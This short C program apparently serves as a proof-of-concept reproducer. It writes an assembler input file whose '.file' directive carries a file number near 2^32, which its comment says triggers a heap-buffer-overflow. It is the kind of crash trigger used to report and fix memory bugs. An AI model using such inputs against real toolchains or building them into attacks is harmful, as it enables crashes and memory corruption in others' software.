#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Trigger heap-buffer-overflow via .file directive with large filenumber */
    /* i = 2^32 - 31 = 4294967265 */
    fprintf(f, ".file %lu \"a\"\n", 4294967265UL);

    fclose(f);
    return 0;
}